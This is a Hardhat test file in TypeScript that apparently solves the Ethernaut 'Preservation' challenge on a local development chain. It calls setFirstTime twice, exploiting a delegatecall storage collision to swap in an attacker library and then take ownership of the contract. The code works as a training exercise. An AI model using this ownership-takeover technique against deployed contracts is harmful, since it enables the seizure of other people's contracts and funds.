import { ethers, network, deployments } from "hardhat"
import { developmentChains } from "../../helper-hardhat-config"
import { assert, expect } from "chai"
import { ExploitLibraryContract, Preservation } from "../../typechain-types"
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"

!developmentChains.includes(network.name)
    ? describe.skip
    : describe("Preservation tests", () => {
          let preservation: Preservation
          let exploit: ExploitLibraryContract
          let accounts: SignerWithAddress[]

          before(async () => {
              accounts = await ethers.getSigners()
              await deployments.fixture(["preservation"])
              preservation = await ethers.getContract("Preservation", accounts[0])
              exploit = await ethers.getContract("ExploitLibraryContract", accounts[0])
          })
          it("preservation exploit", async () => {
              //-n get exploit address converted into uint
              const exploitAddressNumber = await exploit.convertAddressToUint(exploit.address)

              //-n call setFirstTime() in Preservation
              //-n this should set the timeZone1Library address to exploit address
              await (await preservation.setFirstTime(exploitAddressNumber)).wait()

              expect(await preservation.timeZone1Library()).equals(
                  exploit.address,
                  "time zone library 1 address == exploit address"
              )

              //-n next call setFirstTime again, this time with the accounts[0] address
              const exploiterAddressNumber = await exploit.convertAddressToUint(accounts[0].address)

              await (await preservation.setFirstTime(exploiterAddressNumber)).wait()

              expect(await preservation.owner()).equals(
                  accounts[0].address,
                  "owner address = accounts[0] address"
              )
          })
      })
